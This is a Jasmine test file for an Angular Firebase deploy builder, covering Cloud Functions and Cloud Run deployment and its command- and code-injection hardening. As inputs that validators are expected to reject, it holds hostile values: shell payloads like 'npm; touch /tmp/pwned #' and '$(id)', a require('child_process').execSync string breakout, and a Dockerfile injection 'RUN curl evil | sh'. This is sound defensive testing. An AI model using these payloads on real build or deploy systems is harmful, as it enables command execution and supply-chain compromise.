/* eslint-disable @typescript-eslint/no-empty-function */
import { join } from 'path';
import { Script } from 'vm';
import { BuilderContext, BuilderRun, ScheduleOptions, Target } from '@angular-devkit/architect';
import { JsonObject, logging } from '@angular-devkit/core';
import { BuildTarget, DeployBuilderSchema, FSHost, FirebaseDeployConfig, FirebaseTools } from '../interfaces';
import deploy, { assertSafeDependencyName, assertSafeFunctionName, assertSafeNodeVersion, assertSafeOutputPath, assertSupportedPackageManager, buildCloudRunBuildsSubmitArgs, buildCloudRunDeployArgs, deployToCloudRun, deployToFunction, findPackageVersion, processHost } from './actions.js'
import 'jasmine';

let context: BuilderContext;
let firebaseMock: FirebaseTools;
let fsHost: FSHost;

const FIREBASE_PROJECT = 'ikachu-aa3ef';
const PROJECT = 'pirojok-project';
const STATIC_BUILD_TARGET: BuildTarget = {
  name: `${PROJECT}:build:production`
};

const FIREBASE_TOKEN = 'kkasllkascnkjnskjsdcskdckskdksdkjc';

const SERVER_BUILD_TARGET: BuildTarget = {
  name: `${PROJECT}:server:production`
};

const login = () => Promise.resolve({ user: { email: 'foo@bar.baz' }});
login.list = () => Promise.resolve([{ user: { email: 'foo@bar.baz' }}]);
login.add = () => Promise.resolve([{ user: { email: 'foo@bar.baz' }}]);
login.use = () => Promise.resolve('foo@bar.baz');

const workspaceRoot = join('home', 'user');

const initMocks = () => {
  fsHost = {
    moveSync(_: string, __: string) {
    },
    renameSync(_: string, __: string) {
    },
    writeFileSync(_: string, __: string) {
    },
    copySync(_: string, __: string) {
    },
    removeSync(_: string) {
    },
    existsSync(_: string) {
      return false;
    },
  };

  firebaseMock = {
    login,
    projects: {
      list: () => Promise.resolve([]),
      create: () => Promise.reject(),
    },
    apps: {
      list: () => Promise.resolve([]),
      create: () => Promise.reject(),
      sdkconfig: () => Promise.resolve({ fileName: '_', fileContents: '', sdkConfig: {}, }),
    },
    hosting: {
      sites: {
        list: () => Promise.resolve({sites: []}),
        create: () => Promise.reject(),
      }
    },
    init() {
      return Promise.resolve()
    },
    deploy: (_: FirebaseDeployConfig) => Promise.resolve(),
    use: () => Promise.resolve(),
    logger: {
      add: () => { },
      logger: {
        add: () => { }
      }
    },
    cli: { version: () => '9.0.0' },
    serve: () => Promise.resolve()
  };

  context = ({
    target: {
      configuration: 'production',
      project: PROJECT,
      target: 'foo'
    },
    builder: {
      builderName: 'mock',
      description: 'mock',
      optionSchema: false
    },
    currentDirectory: 'cwd',
    id: 1,
    logger: new logging.NullLogger() as any,
    workspaceRoot: 'cwd',
    getTargetOptions: (target: Target) => {
      if (target.target === 'build') {
        return { outputPath: 'dist/browser' };
      } else if (target.target === 'server') {
        return { outputPath: 'dist/server' };
      }
    },
    reportProgress: (_: number, __?: number, ___?: string) => {
    },
    reportStatus: (_: string) => {
    },
    reportRunning: () => {
    },
    scheduleBuilder: (_: string, __?: JsonObject, ___?: ScheduleOptions) => Promise.resolve({} as BuilderRun),
    scheduleTarget: (_: Target, __?: JsonObject, ___?: ScheduleOptions) => Promise.resolve({} as BuilderRun)
  } as any);
};

describe('Deploy Angular apps', () => {
  beforeEach(() => initMocks());

  it('should call login', async () => {
    const spy = spyOn(firebaseMock, 'login').and.resolveTo({ email: 'foo@bar.baz' });
    await deploy(
      firebaseMock, context, STATIC_BUILD_TARGET, undefined,
      undefined, undefined, { projectId: FIREBASE_PROJECT, preview: false }
    );
    expect(spy).toHaveBeenCalled();
  });

  it('should not call login', async () => {
    const spy = spyOn(firebaseMock, 'login');
    await deploy(firebaseMock, context, STATIC_BUILD_TARGET, undefined,  undefined, undefined, { preview: false }, FIREBASE_TOKEN);
    expect(spy).not.toHaveBeenCalled();
  });

  it('should invoke the builder', async () => {
    const spy = spyOn(context, 'scheduleTarget').and.callThrough();
    await deploy(firebaseMock, context, STATIC_BUILD_TARGET, undefined,  undefined, undefined, { preview: false });
    expect(spy).toHaveBeenCalled();
    expect(spy).toHaveBeenCalledWith({
      target: 'build',
      configuration: 'production',
      project: PROJECT
    }, undefined);
  });

  it('should allow the buildTarget to be specified', async () => {
    const buildTarget = {
      name: `${PROJECT}:prerender`,
      options: {}
    };
    const spy = spyOn(context, 'scheduleTarget').and.callThrough();
    await deploy(firebaseMock, context, buildTarget, undefined,  undefined, undefined, { preview: false });
    expect(spy).toHaveBeenCalled();
    expect(spy).toHaveBeenCalledWith({ target: 'prerender', project: PROJECT }, {});
  });

  it('should invoke firebase.deploy', async () => {
    const spy = spyOn(firebaseMock, 'deploy').and.callThrough();
    await deploy(firebaseMock, context, STATIC_BUILD_TARGET, undefined,  undefined, undefined, { preview: false }, FIREBASE_TOKEN);
    expect(spy).toHaveBeenCalled();
    expect(spy).toHaveBeenCalledWith({
      cwd: 'cwd',
      only: 'hosting:' + PROJECT,
      token: FIREBASE_TOKEN,
      nonInteractive: true,
      projectRoot: 'cwd',
    });
  });

  describe('error handling', () => {
    it('throws if there is no firebase project', async () => {
      try {
        await deploy(firebaseMock, context, STATIC_BUILD_TARGET, undefined, undefined, undefined, { preview: false  });
      } catch (e) {
        expect(e.message).toMatch(/Cannot find firebase project/);
      }
    });

    it('throws if there is no target project', async () => {
      context.target = undefined;
      try {
        await deploy(firebaseMock, context, STATIC_BUILD_TARGET, undefined, undefined, undefined, { preview: false });
      } catch (e) {
        expect(e.message).toMatch(/Cannot execute the build target/);
      }
    });
  });
});

describe('universal deployment', () => {
  beforeEach(() => initMocks());

  it('should create a firebase function', async () => {
    const spy = spyOn(fsHost, 'writeFileSync');
    await deployToFunction(
      firebaseMock,
      context,
      workspaceRoot,
      STATIC_BUILD_TARGET,
      SERVER_BUILD_TARGET,
      { preview: false  },
      undefined,
      fsHost
    );

    expect(spy).toHaveBeenCalledTimes(2);

    const packageArgs = spy.calls.argsFor(0);
    const functionArgs = spy.calls.argsFor(1);

    expect(packageArgs[0]).toBe(join(workspaceRoot, 'dist', 'package.json'));
    expect(functionArgs[0]).toBe(join(workspaceRoot, 'dist', 'index.js'));
  });

  it('should create a firebase function (new)', async () => {
    const spy = spyOn(fsHost, 'writeFileSync');
    await deployToFunction(
      firebaseMock,
      context,
      workspaceRoot,
      STATIC_BUILD_TARGET,
      SERVER_BUILD_TARGET,
      { preview: false, outputPath: join('dist', 'functions') },
      undefined,
      fsHost
    );

    expect(spy).toHaveBeenCalledTimes(2);

    const packageArgs = spy.calls.argsFor(0);
    const functionArgs = spy.calls.argsFor(1);

    expect(packageArgs[0]).toBe(join(workspaceRoot, 'dist', 'functions', 'package.json'));
    expect(functionArgs[0]).toBe(join(workspaceRoot, 'dist', 'functions', 'index.js'));
  });

  it('should rename the index.html file in the nested dist', async () => {
    const spy = spyOn(fsHost, 'renameSync');
    await deployToFunction(
      firebaseMock,
      context,
      workspaceRoot,
      STATIC_BUILD_TARGET,
      SERVER_BUILD_TARGET,
      { preview: false  },
      undefined,
      fsHost
    );

    expect(spy).toHaveBeenCalledTimes(1);

    const packageArgs = spy.calls.argsFor(0);

    expect(packageArgs).toEqual([
      join(workspaceRoot, 'dist', 'dist', 'browser', 'index.html'),
      join(workspaceRoot, 'dist', 'dist', 'browser', 'index.original.html')
    ]);
  });

  it('should rename the index.html file in the nested dist (new)', async () => {
    const spy = spyOn(fsHost, 'renameSync');
    await deployToFunction(
      firebaseMock,
      context,
      workspaceRoot,
      STATIC_BUILD_TARGET,
      SERVER_BUILD_TARGET,
      { preview: false, outputPath: join('dist', 'functions') },
      undefined,
      fsHost
    );

    expect(spy).toHaveBeenCalledTimes(1);

    const packageArgs = spy.calls.argsFor(0);

    expect(packageArgs).toEqual([
      join(workspaceRoot, 'dist', 'functions', 'dist', 'browser', 'index.html'),
      join(workspaceRoot, 'dist', 'functions', 'dist', 'browser', 'index.original.html')
    ]);
  });

  it('should invoke firebase.deploy', async () => {
    const spy = spyOn(firebaseMock, 'deploy');
    await deployToFunction(
      firebaseMock,
      context,
      workspaceRoot,
      STATIC_BUILD_TARGET,
      SERVER_BUILD_TARGET,
      { preview: false },
      undefined,
      fsHost
    );

    expect(spy).toHaveBeenCalledTimes(1);
  });

  /* TODO figure out how to stub the prompt
  it('should not deploy if the command is invoked with --preview', async () => {
    const spy = spyOn(firebaseMock, 'deploy');
    await deployToFunction(firebaseMock, context, '/home/user', projectTargets, true, fsHost);
    expect(spy).not.toHaveBeenCalled();
  });*/
});

describe('Cloud Run gcloud argv construction', () => {
  // Regression coverage for the argv-injection fix: these options used to be interpolated
  // into a single command string and split on whitespace, so a value containing a space
  // would land as extra, unintended argv entries. They're now passed straight through as
  // individual array elements.
  const INJECTED_REGION = 'us-central1 --set-env-vars=INJECTED=owned';
  const INJECTED_PROJECT = `${FIREBASE_PROJECT} --format=json`;

  it('keeps a region value containing a space as a single --region argument', () => {
    const options: DeployBuilderSchema = { firebaseProject: FIREBASE_PROJECT, region: INJECTED_REGION };
    const args = buildCloudRunDeployArgs('my-service', options, []);

    expect(args[args.indexOf('--region') + 1]).toBe(INJECTED_REGION);
    expect(args).not.toContain('--set-env-vars=INJECTED=owned');
  });

  it('keeps a firebaseProject value containing a space as a single --project argument (deploy)', () => {
    const options: DeployBuilderSchema = { firebaseProject: INJECTED_PROJECT, region: 'us-central1' };
    const args = buildCloudRunDeployArgs('my-service', options, []);

    expect(args[args.indexOf('--project') + 1]).toBe(INJECTED_PROJECT);
    expect(args).not.toContain('--format=json');
  });

  it('keeps a firebaseProject value containing a space as a single --project argument (builds submit)', () => {
    const options: DeployBuilderSchema = { firebaseProject: INJECTED_PROJECT };
    const args = buildCloudRunBuildsSubmitArgs('cloudRunOut', 'my-service', options);

    expect(args[args.indexOf('--project') + 1]).toBe(INJECTED_PROJECT);
    expect(args).not.toContain('--format=json');
  });

  it('passes cloudRunOptions through as their own argv entries', () => {
    const options: DeployBuilderSchema = { firebaseProject: FIREBASE_PROJECT, region: 'us-central1' };
    const args = buildCloudRunDeployArgs('my-service', options, ['--vpc-connector', 'my-connector --unset-env-vars=OWNED']);

    expect(args[args.indexOf('--vpc-connector') + 1]).toBe('my-connector --unset-env-vars=OWNED');
    expect(args).not.toContain('--unset-env-vars=OWNED');
  });
});

describe('deploy input validation (command-injection hardening)', () => {
  describe('assertSupportedPackageManager', () => {
    ['npm', 'yarn', 'pnpm', 'cnpm', 'bun'].forEach((pm) => {
      it(`allows the supported package manager "${pm}"`, () => {
        expect(assertSupportedPackageManager(pm)).toBe(pm);
      });
    });

    it('rejects a package manager carrying a shell payload', () => {
      expect(() => assertSupportedPackageManager('npm; touch /tmp/pwned #'))
        .toThrowError(/Unsupported package manager/);
    });

    it('rejects an arbitrary executable path', () => {
      expect(() => assertSupportedPackageManager('/tmp/evil')).toThrowError(/Unsupported package manager/);
    });
  });

  describe('assertSafeDependencyName', () => {
    ['rxjs', '@angular/core', '@angular/*', 'some-pkg', 'a.b_c'].forEach((name) => {
      it(`allows the valid dependency name "${name}"`, () => {
        expect(assertSafeDependencyName(name)).toBe(name);
      });
    });

    ['evil; touch /tmp/pwned #', 'a b', '$(id)', '`id`', 'a|b', 'a&b', '-rf', '', 'a>b'].forEach((name) => {
      it(`rejects the unsafe dependency name ${JSON.stringify(name)}`, () => {
        expect(() => assertSafeDependencyName(name)).toThrowError(/Invalid dependency name/);
      });
    });
  });

  // These guard the fix at its call sites: the validators above are only useful
  // if the deploy code keeps routing every command through the shell-free runner.
  // A regression to execSync/`shell: true`, or a dropped validator call, fails here.
  describe('call sites route through the shell-free runner', () => {
    beforeEach(() => initMocks());

    it('installs functions dependencies via the runner with an argv array and no shell', async () => {
      // The install branch only runs when the generated package.json exists.
      spyOn(fsHost, 'existsSync').and.returnValue(true);
      const runSpy = spyOn(processHost, 'runPackageBin').and.returnValue(Buffer.from(''));

      await deployToFunction(
        firebaseMock,
        context,
        workspaceRoot,
        STATIC_BUILD_TARGET,
        SERVER_BUILD_TARGET,
        { preview: false },
        undefined,
        fsHost
      );

      expect(runSpy).toHaveBeenCalledTimes(1);
      const [command, args, options] = runSpy.calls.mostRecent().args;
      expect(command).toBe('npm');
      expect(args).toEqual(['--prefix', join(workspaceRoot, 'dist'), 'install']);
      // No shell: a `shell` option would reopen the injection this PR closes.
      expect((options as any)?.shell).toBeFalsy();
    });

    it('runs the package manager through the runner with a validated argv array', () => {
      const runSpy = spyOn(processHost, 'runPackageBin').and.returnValue(Buffer.from(''));

      findPackageVersion('npm', 'rxjs');

      expect(runSpy).toHaveBeenCalledWith('npm', ['list', 'rxjs']);
    });

    it('rejects an unsupported package manager before spawning anything', () => {
      const runSpy = spyOn(processHost, 'runPackageBin');

      expect(() => findPackageVersion('npm; touch /tmp/pwned #', 'rxjs'))
        .toThrowError(/Unsupported package manager/);
      expect(runSpy).not.toHaveBeenCalled();
    });

    it('rejects an unsafe dependency name before spawning anything', () => {
      const runSpy = spyOn(processHost, 'runPackageBin');

      expect(() => findPackageVersion('npm', 'evil; touch /tmp/pwned #'))
        .toThrowError(/Invalid dependency name/);
      expect(runSpy).not.toHaveBeenCalled();
    });
  });
});

describe('generated artifact validation (codegen-injection hardening)', () => {
  describe('assertSafeOutputPath', () => {
    [
      'dist/browser', 'dist/server', 'dist/my-app/browser', 'out', 'a.b-c_d/e', '../dist/browser',
      // Only a shell would act on these, and the one place the path reaches a shell is the
      // generated start script, which quotes it. So they are unusual directory names rather
      // than a way through, and rejecting them would break a deploy that works today.
      'dist/my app', 'dist/*', 'dist/?pp', 'dist/[ab]', '~/x', 'dist\tserver', 'a;b', 'a|b',
    ].forEach((outputPath) => {
      it(`allows the valid outputPath ${JSON.stringify(outputPath)}`, () => {
        expect(() => assertSafeOutputPath(outputPath, 'proj:server')).not.toThrow();
      });
    });

    [
      `x'); require('child_process').execSync('id'); ('`,
      'a`id`', 'a$(id)', 'a$HOME', 'a\nb', 'a\rb', 'a"b', 'a\\b', '-rf',
    ].forEach((outputPath) => {
      it(`rejects the unsafe outputPath ${JSON.stringify(outputPath)}`, () => {
        expect(() => assertSafeOutputPath(outputPath, 'proj:server')).toThrowError(/Unsafe outputPath/);
      });
    });
  });

  describe('assertSafeNodeVersion', () => {
    // A Docker tag, since the Cloud Run path renders it as `FROM node:<version>-slim`.
    [undefined, 18, 20, '18', '18.19', '20.11.1', 'lts', 'current', 'iron', '22-bookworm'].forEach((version) => {
      it(`allows the valid functionsNodeVersion ${JSON.stringify(version)}`, () => {
        expect(() => assertSafeNodeVersion(version)).not.toThrow();
      });
    });

    [
      '18-slim\nRUN curl evil | sh', '18 && id', '18;id', '$(id)', '`id`', '18/../x', 'x:y', 'x@sha256',
      // Grammatical, but node:latest-slim has never been published.
      'latest',
      // Docker caps a tag at 128 characters.
      '2'.repeat(129),
    ].forEach((version) => {
      it(`rejects the unsafe functionsNodeVersion ${JSON.stringify(version)}`, () => {
        expect(() => assertSafeNodeVersion(version)).toThrowError(/Unsafe functionsNodeVersion/);
      });
    });
  });

  describe('assertSafeFunctionName', () => {
    // These are the names that can actually arrive: the schema pattern for functionName is
    // the wider Cloud Run service-ID rule, and this is the JavaScript-identifier rule the
    // Cloud Functions path needs on top of it.
    [undefined, 'ssr', 'ssrHandler', 'a1', 'my_fn'].forEach((functionName) => {
      it(`allows the valid functionName ${JSON.stringify(functionName)}`, () => {
        expect(() => assertSafeFunctionName(functionName)).not.toThrow();
      });
    });

    [`ssr; require('child_process').execSync('id'); var _x`, 'my-fn', 'a b', '1fn', 'a.b', `a'`].forEach((functionName) => {
      it(`rejects the unsafe functionName ${JSON.stringify(functionName)}`, () => {
        expect(() => assertSafeFunctionName(functionName)).toThrowError(/Unsafe functionName/);
      });
    });
  });
});

// Runs a generated index.js against stubs, recording what it required and what it ran, so a
// payload that escaped its context is caught by having executed rather than by how it reads.
const runGeneratedFunction = (source: string) => {
  const required: string[] = [];
  const executed: string[] = [];
  const stub: Record<string, any> = {
    app: () => ({}),
    https: { onRequest: (app: unknown) => app },
    execSync: (command: string) => { executed.push(command); return ''; },
  };
  stub.region = () => stub;
  stub.runWith = () => stub;
  const exports: Record<string, unknown> = {};
  const run = () => new Script(source).runInNewContext({
    exports,
    module: { exports },
    require: (id: string) => { required.push(id); return stub; },
  });
  return { required, executed, exports, run };
};

// These drive the builders end-to-end so the protection cannot be silently dropped: every
// assertSafe* call site in deployToFunction / deployToCloudRun is covered by a spec here
// that fails if that call is removed, and so is the region escaping in the template. That
// includes the static build target, whose outputPath only ever reaches the filesystem and
// so has nothing exploitable to assert beyond the rejection itself.
describe('generated artifact validation is wired into the builders', () => {
  beforeEach(() => initMocks());

  const withOutputPaths = (
    staticOutputPath: string,
    serverOutputPath: string,
  ): BuilderContext['getTargetOptions'] => (target: Target) => {
    if (target.target === 'build') { return Promise.resolve({ outputPath: staticOutputPath }); }
    if (target.target === 'server') { return Promise.resolve({ outputPath: serverOutputPath }); }
    // Matches architect, which throws rather than handing back options-less targets.
    throw new Error(`Invalid target: ${JSON.stringify(target)}.`);
  };

  const withServerOutputPath = (outputPath: string) => withOutputPaths('dist/browser', outputPath);
  const withStaticOutputPath = (outputPath: string) => withOutputPaths(outputPath, 'dist/server');

  const EVIL_PATH = `dist'); require('child_process').execSync('id'); ('`;

  it('deployToFunction rejects a hostile server outputPath', async () => {
    context.getTargetOptions = withServerOutputPath(EVIL_PATH);
    await expectAsync(deployToFunction(
      firebaseMock, context, workspaceRoot, STATIC_BUILD_TARGET, SERVER_BUILD_TARGET,
      { preview: false }, undefined, fsHost
    )).toBeRejectedWithError(/Unsafe outputPath/);
  });

  it('deployToFunction rejects a hostile static outputPath', async () => {
    context.getTargetOptions = withStaticOutputPath(EVIL_PATH);
    await expectAsync(deployToFunction(
      firebaseMock, context, workspaceRoot, STATIC_BUILD_TARGET, SERVER_BUILD_TARGET,
      { preview: false }, undefined, fsHost
    )).toBeRejectedWithError(/Unsafe outputPath/);
  });

  it('deployToFunction rejects a server outputPath that starts with a dash', async () => {
    context.getTargetOptions = withServerOutputPath('-rf');
    await expectAsync(deployToFunction(
      firebaseMock, context, workspaceRoot, STATIC_BUILD_TARGET, SERVER_BUILD_TARGET,
      { preview: false }, undefined, fsHost
    )).toBeRejectedWithError(/Unsafe outputPath/);
  });

  it('deployToFunction rejects a functionName that is not a plain identifier', async () => {
    await expectAsync(deployToFunction(
      firebaseMock, context, workspaceRoot, STATIC_BUILD_TARGET, SERVER_BUILD_TARGET,
      { preview: false, functionName: `ssr; require('child_process').execSync('id'); var _x` },
      undefined, fsHost
    )).toBeRejectedWithError(/Unsafe functionName/);
  });

  it('deployToFunction escapes region into the generated function instead of interpolating it raw', async () => {
    const spy = spyOn(fsHost, 'writeFileSync');
    const region = `us-central1'); require('child_process').execSync('id'); ('`;
    await deployToFunction(
      firebaseMock, context, workspaceRoot, STATIC_BUILD_TARGET, SERVER_BUILD_TARGET,
      { preview: false, region }, undefined, fsHost
    );
    // By path rather than by call order, so adding or reordering a write does not silently
    // point this at the wrong file.
    const write = spy.calls.allArgs().find(([path]) => path.endsWith('index.js'));
    if (!write) { throw new Error('deployToFunction wrote no index.js'); }
    const indexJs = write[1];
    expect(indexJs).toContain(`.region(${JSON.stringify(region)})`);

    // Interpolated raw, the payload closes `.region('` and the require becomes a statement
    // of its own, which runs when the function loads. Rendered through the fixed template it
    // stays inside a string literal, so running the source touches neither.
    const generated = runGeneratedFunction(indexJs);
    expect(generated.run).not.toThrow();
    expect(generated.executed).toEqual([]);
    expect(generated.required).not.toContain('child_process');
    expect(Object.keys(generated.exports)).toEqual(['ssr']);
  });

  it('deployToCloudRun rejects a hostile server outputPath', async () => {
    context.getTargetOptions = withServerOutputPath(EVIL_PATH);
    await expectAsync(deployToCloudRun(
      firebaseMock, context, workspaceRoot, STATIC_BUILD_TARGET, SERVER_BUILD_TARGET,
      { preview: false }, undefined, fsHost
    )).toBeRejectedWithError(/Unsafe outputPath/);
  });

  it('deployToCloudRun rejects a hostile static outputPath', async () => {
    context.getTargetOptions = withStaticOutputPath(EVIL_PATH);
    await expectAsync(deployToCloudRun(
      firebaseMock, context, workspaceRoot, STATIC_BUILD_TARGET, SERVER_BUILD_TARGET,
      { preview: false }, undefined, fsHost
    )).toBeRejectedWithError(/Unsafe outputPath/);
  });

  it('deployToCloudRun rejects a hostile functionsNodeVersion', async () => {
    await expectAsync(deployToCloudRun(
      firebaseMock, context, workspaceRoot, STATIC_BUILD_TARGET, SERVER_BUILD_TARGET,
      { preview: false, functionsNodeVersion: '18-slim\nRUN curl evil | sh' }, undefined, fsHost
    )).toBeRejectedWithError(/Unsafe functionsNodeVersion/);
  });

  it('deployToCloudRun rejects a hostile functionsNodeVersion before touching the output directory', async () => {
    const removeSpy = spyOn(fsHost, 'removeSync');
    const copySpy = spyOn(fsHost, 'copySync');
    const writeSpy = spyOn(fsHost, 'writeFileSync');

    await expectAsync(deployToCloudRun(
      firebaseMock, context, workspaceRoot, STATIC_BUILD_TARGET, SERVER_BUILD_TARGET,
      { preview: false, functionsNodeVersion: '18-slim\nRUN curl evil | sh' }, undefined, fsHost
    )).toBeRejectedWithError(/Unsafe functionsNodeVersion/);

    expect(removeSpy).not.toHaveBeenCalled();
    expect(copySpy).not.toHaveBeenCalled();
    expect(writeSpy).not.toHaveBeenCalled();
  });
});
